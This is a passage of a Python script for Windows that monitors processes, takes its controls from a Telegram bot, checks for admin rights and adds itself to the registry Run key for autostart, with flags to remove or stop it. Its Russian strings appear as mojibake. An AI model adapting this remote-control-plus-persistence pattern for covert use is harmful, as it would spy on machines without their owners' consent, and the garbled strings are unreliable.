    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–µ –ø—Ä–∞–≤–∞"""
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def monitor_processes():
    """–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –Ω–æ–≤—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤"""
    keyboard = create_main_keyboard()
    send_telegram_message(
        "<b>üîî –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å–∏—Å—Ç–µ–º—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω</b>\n\n"
        "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:",
        reply_markup=keyboard
    )
    
    while monitoring_active:
        handle_updates()
        time.sleep(1)

def handle_command(command):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥"""
    if command == '--autostart':
        if add_to_autostart():
            print("–î–æ–±–∞–≤–ª–µ–Ω–æ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É")
        else:
            print("–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É")
    elif command == '--remove':
        if remove_from_autostart():
            print("–£–¥–∞–ª–µ–Ω–æ –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")
        else:
            print("–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")
    elif command == '--stop':
        if remove_from_autostart():
            print("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∏ —É–¥–∞–ª–µ–Ω –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")
        else:
            print("–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")
        sys.exit(0)
    else:
        print("–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        handle_command(sys.argv[1])
    else:
        if not is_admin():
            print("–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—â–µ–Ω–∞ –±–µ–∑ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞")
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, APP_NAME)
            winreg.CloseKey(key)
            print("–†–µ–∂–∏–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ (–≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ)")
        except:
            print("–í—Ä–µ–º–µ–Ω–Ω—ã–π —Ä–µ–∂–∏–º (–Ω–µ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ)")
        
        monitor_processes()